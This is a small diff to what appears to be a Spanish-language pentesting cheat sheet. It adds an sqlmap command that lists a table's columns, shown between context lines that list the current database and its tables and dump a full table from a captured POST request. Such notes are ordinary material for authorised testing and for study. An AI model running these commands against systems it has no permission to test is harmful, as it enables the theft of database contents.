@@ -363,6 +363,9 @@ Anthares101@kali:~$ sqlmap --current-db --batch -r post_request.txt
 Anthares101@kali:~$ sqlmap -D DB --tables --batch -r post_request.txt
 # Extrae la tablas de una determinada base de datos
 
+Anthares101@kali:~$ sqlmap -D DB -T TABLA --columns -r post_request.txt
+# Extrae información de las columnas de una determinada tabla
+
 Anthares101@kali:~$ sqlmap -D DB -T TABLA --dump --batch -r post_request.txt
 # Hace una copia de toda la información de una determinada tabla de una determinada base de datos
 ```
